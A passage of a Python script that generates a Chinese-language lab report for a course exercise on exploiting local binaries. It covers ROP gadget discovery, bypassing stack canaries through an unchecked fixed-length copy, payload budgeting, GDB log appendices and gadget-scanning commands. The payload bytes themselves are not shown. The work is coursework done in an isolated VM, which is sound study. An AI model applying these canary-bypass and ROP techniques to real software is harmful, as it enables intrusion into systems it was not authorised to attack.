    bullet(doc, "指令边界是人的约定：41 5f c3 往前挪一个字节，pop r15 就变 pop rdi。ROP 的本质是「别人的字节流，我的控制流」。", "③ ")
    bullet(doc, "金丝雀只守着窝：它检测「值被改」，不检测「控制流被改」。攻击者要做的不是骗过它，而是找一条不经过它的路——dark-log 的 len 定长拷贝就是那条路。防御必须覆盖每一个越界写原语。", "④ ")
    bullet(doc, "预算思维：固定栈到返回地址为 24 字节、到守卫页为 48 字节；eval 只截取前 15 个表达式字符。先测量边界再设计 payload，可避免 gets 在控制流转移前触发守卫页错误。", "⑤ ")
    heading(doc, "局限与说明", 2)
    bullet(doc, "实验在 VirtualBox Ubuntu 24.04（glibc 2.39）完成，与 CI 的 ubuntu-24.04 环境一致。payload 只依赖非 PIE 固定代码地址与 dark-calc 的固定映射，不依赖 glibc 内部布局；gets/system 等符号在本环境均存在；")
    bullet(doc, "dark-calc 的 0x721000000000 固定映射假设该区间未被占用（MAP_FIXED_NOREPLACE 失败时程序会报错退出），当前内核与 CI 环境均成立；")
    bullet(doc, "各 payload 的实际退出状态来自 ev[\"ci\"]："
               + "；".join(f"{name} target_rc={ci_records[name]['target_rc']}"
                          for name in ("payload.py", "payload_dark.py", "payload_rop.py", "payload_canary.py"))
               + "。stdout 命中不等于正常退出，当前官方检查只搜索 stdout；")
    bullet(doc, "文中标注的 GDB/运行记录可按第十一节命令复现；报告构建只读取记录，"
                "不把静态设计推导或生成器 hexdump 当作目标运行实测。")
    heading(doc, "时间线", 2)
    table(doc,
          ["时间", "事件"],
          [
              ["2026-11-23", "首次采集证据（内核 7.0.0-31 / glibc 2.39-0ubuntu8.9）"],
              ["2026-11-24", "系统升级到 7.0.0-43 / 2.39-0ubuntu8.12 后重跑本地证据采集并拍摄终端截图"],
              ["2026-11-24", "公开 run 45372795393（基线提交 d54873f）两个 job 均成功；后续变更以新 run 为准"],
              ["2026-11-25", "payload.py 修复（干净 exit(0)）后重拍五张终端截图并重建 DOCX/PDF"],
          ],
          widths=[3.2, 13.8])
    page_break(doc)

    # ---------- 附录 A ----------
    heading(doc, "附录 A：四个 payload 的完整清单与十六进制转储", 1)
    picture(doc, os.path.join(FIGS, "fig_payloads.png"), 4.2, "图 5  终端截图：四个 payload 的字节转储（od）")
    for name in ("payload.py", "payload_dark.py", "payload_rop.py", "payload_canary.py"):
        heading(doc, name, 2)
        code(doc, open(os.path.join(ROOT, name), encoding="utf-8").read())
        code(doc, payload_hexdump(name))
    page_break(doc)

    # ---------- 附录 B ----------
    heading(doc, "附录 B：关键 GDB 实录摘录", 1)
    para(doc, "以下为正文引用的关键片段；完整日志见 analysis/gdb/。")
    for title, text in [
        ("B.1 栈帧与 main 机器码（01_frame_and_main.txt）",
         ev["frame_entry"] + "\n\n" + ev["frame_prologue"] + "\n\n" + ev["frame_after_gets"] + "\n\n" + ev["main_bytes"]),
        ("B.2 固定栈与 shellcode（02_fixed_stack.txt）",
         ev["wrap_entry"] + "\n\n" + ev["fixed_maps"] + "\n\n" + ev["shellcode_inspect"] + "\n\n" + ev["grade_hit"] + "\n\n" + ev["shellcode_result"]),
        ("B.3 NX 取指崩溃（03_nx.txt）",
         ev["nx_frame"].split("info proc mappings")[0].rstrip() + "\n\n" + ev["nx_maps"] + "\n\n" + ev["nx_fault"]),
        ("B.4 canary 保留绕过（04_canary.txt）",
         ev["canary_before"] + "\n\n" + ev["canary_after"] + "\n\n" + ev["canary_hit"].split("#1")[0].rstrip() + "\n\n" + ev["canary_end"]),
        ("B.5 canary 对照：覆盖检测（04b_canary_smash.txt）",
         ev["smash_before"] + "\n\n" + ev["smash_after"]),
        ("B.6 payload.py 的 system 调用点（05_system_epilogue.txt）",
         ev["sys_site"] + "\n\n" + ev["sys_after"] + "\n\n" + ev["sys_epilogue"]),
    ]:
        if text.strip():
            heading(doc, title, 2)
            code(doc, text)
    page_break(doc)

    # ---------- 附录 C ----------
    heading(doc, "附录 C：环境参数与文件哈希", 1)
    code(doc, ev["aslr"])
    table(doc, ["参数", "取值"],
          [[k, str(v)] for k, v in env.items()],
          widths=[5.5, 11.5], mono_cols=(1,))
    para(doc, "随本报告提交的五个 Python 文件的 SHA-256（构建时现场计算）：")
    live_rows = []
    for name in ("attacklab.py", "payload.py", "payload_dark.py", "payload_rop.py", "payload_canary.py"):
        h = hashlib.sha256(open(os.path.join(ROOT, name), "rb").read()).hexdigest()
        live_rows.append([name, h])
    table(doc, ["文件", "SHA-256（提交时）"], live_rows,
          widths=[5.2, 11.8], mono_cols=(1,))
    para(doc, "攻击涉及的全部输入均为本课程自带的本地实验程序，不针对任何第三方系统；"
              "全部实验在隔离的 VirtualBox Ubuntu 24.04 虚拟机内完成。")

    # ---------- 附录 D ----------
    heading(doc, "附录 D：常用命令速查", 1)
    code(doc, "# 段/符号/反汇编\n"
              "readelf -lW attack/dark-calc      # 程序头：GNU_STACK / LOAD 权限\n"
              "nm -C attack/dark-calc           # 符号与地址\n"
              "objdump -d -M intel attack/dark-calc          # 反汇编\n"
              "objdump -d --start-address=0x401a32 --stop-address=0x401a35 attack/dark-calc-nx\n\n"
              "# gadget 字节扫描（tools/gadgets.py）\n"
              "python3 tools/gadgets.py attack/dark-calc 5fc3 c3   # 找 pop rdi; ret / ret\n\n"
              "# GDB 批量会话（自动准备隔离副本与 fixtures）\n"
              "bash tools/capture_gdb.sh\n"
              "# 注意：每个脚本开头都有 set disable-randomization off，观察真实 ASLR\n\n"
              "# 完整性\n"
              "bash tools/hash_check.sh          # 对照 CI 的 sha256 清单\n\n"
              "# 端到端（与 CI 核心判分动作等价）\n"
              "bash tools/verify_ci.sh")

    doc.save(OUT)
    print("saved", OUT)


if __name__ == "__main__":
    build(load_evidence())
